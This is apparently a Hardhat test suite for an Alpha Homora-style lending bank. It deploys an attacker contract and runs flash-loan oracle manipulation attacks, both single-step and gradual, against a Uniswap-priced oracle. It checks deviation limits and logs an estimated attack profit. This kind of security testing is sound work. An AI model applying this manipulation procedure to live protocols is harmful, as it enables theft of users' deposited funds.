const { expect } = require('chai');
const { ethers } = require('hardhat');

/**
 * Alpha Homora Oracle Manipulation Test Suite
 * Tests flash loan oracle manipulation vulnerabilities
 */
describe('Alpha Homora Oracle Manipulation Tests', function () {
    let alphaToken, pair, router, oracle, bank, attacker;
    let owner, user, liquidator;
    
    const INITIAL_LIQUIDITY_ALPHA = ethers.parseEther('10000000'); // 10M ALPHA
    const INITIAL_LIQUIDITY_ETH = ethers.parseEther('1000'); // 1000 ETH
    const ATTACK_AMOUNT = ethers.parseEther('50000000'); // 50M ALPHA
    
    beforeEach(async function () {
        [owner, user, liquidator] = await ethers.getSigners();
        
        // Deploy AlphaToken
        const AlphaToken = await ethers.getContractFactory('AlphaToken');
        alphaToken = await AlphaToken.deploy();
        
        // Deploy Uniswap V2 (simplified for testing)
        const UniswapV2Factory = await ethers.getContractAt(
            'IUniswapV2Factory',
            '0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f'
        );
        
        const UniswapV2Router = await ethers.getContractAt(
            'IUniswapV2Router02',
            '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'
        );
        router = UniswapV2Router;
        
        // Create ALPHA/ETH pair
        await alphaToken.approve(await router.getAddress(), INITIAL_LIQUIDITY_ALPHA);
        await router.addLiquidityETH(
            await alphaToken.getAddress(),
            INITIAL_LIQUIDITY_ALPHA,
            0,
            0,
            owner.address,
            Math.floor(Date.now() / 1000) + 300,
            { value: INITIAL_LIQUIDITY_ETH }
        );
        
        const pairAddress = await UniswapV2Factory.getPair(
            await alphaToken.getAddress(),
            await router.WETH()
        );
        pair = await ethers.getContractAt('IUniswapV2Pair', pairAddress);
        
        // Deploy ProxyOracle
        const ProxyOracle = await ethers.getContractFactory('ProxyOracle');
        oracle = await ProxyOracle.deploy(pairAddress);
        
        // Deploy HomoraBankV2 (vulnerable version for testing)
        const HomoraBankV2 = await ethers.getContractFactory('HomoraBankV2');
        bank = await HomoraBankV2.deploy(
            await alphaToken.getAddress(),
            await oracle.getAddress(),
            false // Not vulnerable to rounding
        );
        
        // Fund bank
        await owner.sendTransaction({
            to: await bank.getAddress(),
            value: ethers.parseEther('500')
        });
        
        // Deploy attacker
        const FlashLoanAttacker = await ethers.getContractFactory('FlashLoanAttacker');
        attacker = await FlashLoanAttacker.deploy(
            await bank.getAddress(),
            await oracle.getAddress(),
            await alphaToken.getAddress(),
            pairAddress,
            await router.getAddress()
        );
        
        // Fund attacker
        await alphaToken.transfer(await attacker.getAddress(), ATTACK_AMOUNT);
    });
    
    describe('Oracle Manipulation Attack', function () {
        it('Should demonstrate oracle manipulation attempt', async function () {
            console.log('\n=== ALPHA HOMORA ORACLE MANIPULATION TEST ===\n');
            
            // Step 1: Record initial state
            const priceBeforeAttack = await oracle.getPriceUnsafe(await alphaToken.getAddress());
            console.log('Initial ALPHA Price:', ethers.formatEther(priceBeforeAttack), 'ALPHA per ETH');
            
            // Step 2: Simulate attack
            const simulation = await attacker.simulateAttack(ATTACK_AMOUNT);
            
            console.log('\nAttack Simulation:');
            console.log('- Price before:', ethers.formatEther(simulation[0]), 'ALPHA per ETH');
            console.log('- Price after manipulation:', ethers.formatEther(simulation[1]), 'ALPHA per ETH');
            console.log('- Deviation:', (simulation[2] * 100n / ethers.parseEther('1')).toString() + '%');
            console.log('- Will succeed:', simulation[4]);
            console.log('- Estimated profit:', ethers.formatEther(simulation[3]), 'ETH');
            
            // Step 3: Execute attack
            await attacker.executeOracleManipulation(ATTACK_AMOUNT, { value: ethers.parseEther('1') });
            
            // Step 4: Check results
            const attackSuccessful = await attacker.wasAttackSuccessful();
            const profit = await attacker.calculateProfit();
            
            console.log('\nAttack Results:');
            console.log('- Attack successful:', attackSuccessful);
            console.log('- Profit:', ethers.formatEther(profit), 'ETH');
            
            if (attackSuccessful) {
                console.log('\n⚠️  VULNERABILITY CONFIRMED - Oracle manipulation successful!');
            } else {
                console.log('\n✅ ATTACK PREVENTED - Deviation limits working!');
            }
            
            console.log('\n=== TEST COMPLETE ===\n');
        });
        
        it('Should test deviation limit protection', async function () {
            console.log('\n=== TESTING DEVIATION LIMITS ===\n');
            
            const priceBeforeAttack = await oracle.getPriceUnsafe(await alphaToken.getAddress());
            
            // Try to manipulate price beyond 50% deviation
            try {
                await attacker.executeOracleManipulation(ATTACK_AMOUNT, { value: ethers.parseEther('1') });
                
                const priceAfterAttack = await oracle.getPrice(await alphaToken.getAddress());
                const deviation = ((priceAfterAttack - priceBeforeAttack) * 100n) / priceBeforeAttack;
                
                console.log('Price deviation:', deviation.toString() + '%');
                
                if (deviation > 50n) {
                    console.log('❌ VULNERABILITY: Deviation exceeds 50% limit!');
                    expect(deviation).to.be.lte(50n);
                } else {
                    console.log('✅ PROTECTED: Deviation within limits');
                }
            } catch (error) {
                console.log('✅ ATTACK PREVENTED: Transaction reverted');
                console.log('Reason:', error.message);
            }
            
            console.log('\n=== DEVIATION TEST COMPLETE ===\n');
        });
    });
    
    describe('Gradual Manipulation Attack', function () {
        it('Should test multi-step price manipulation', async function () {
            console.log('\n=== GRADUAL MANIPULATION TEST ===\n');
            
            const stepsAmount = ATTACK_AMOUNT / 5n; // 5 steps
            const steps = 5;
            
            await attacker.executeGradualManipulation(stepsAmount, steps, { value: ethers.parseEther('1') });
            
            const attackSuccessful = await attacker.wasAttackSuccessful();
            
            console.log('Gradual manipulation result:', attackSuccessful ? 'SUCCESS' : 'FAILED');
            
            if (attackSuccessful) {
                console.log('⚠️  Multi-step manipulation bypassed deviation limits!');
            } else {
                console.log('✅ Gradual manipulation also prevented');
            }
            
            console.log('\n=== GRADUAL TEST COMPLETE ===\n');
        });
    });
    
    describe('Profitability Analysis', function () {
        it('Should calculate attack profitability', async function () {
            console.log('\n=== PROFITABILITY ANALYSIS ===\n');
            
            const simulation = await attacker.simulateAttack(ATTACK_AMOUNT);
            
            console.log('Attack Parameters:');
            console.log('- Attack size:', ethers.formatEther(ATTACK_AMOUNT), 'ALPHA');
            console.log('- Price impact:', (simulation[2] * 100n / ethers.parseEther('1')).toString() + '%');
            console.log('- Estimated profit:', ethers.formatEther(simulation[3]), 'ETH');
            console.log('- Will succeed:', simulation[4]);
            
            const swapFee = ATTACK_AMOUNT * 3n / 1000n;
            console.log('\nAttack Costs:');
            console.log('- Swap fees:', ethers.formatEther(swapFee), 'ALPHA');
            console.log('- Gas costs: ~0.5 ETH (estimated)');
            
            if (simulation[4]) {
                const netProfit = simulation[3] - ethers.parseEther('0.5');
                console.log('\nNet Profit:', ethers.formatEther(netProfit), 'ETH');
                console.log('ROI:', ((netProfit * 100n) / ethers.parseEther('0.5')).toString() + '%');
                console.log('\n⚠️  ATTACK IS PROFITABLE!');
            } else {
                console.log('\n✅ Attack not profitable - prevented by deviation limits');
            }
            
            console.log('\n=== ANALYSIS COMPLETE ===\n');
        });
    });
});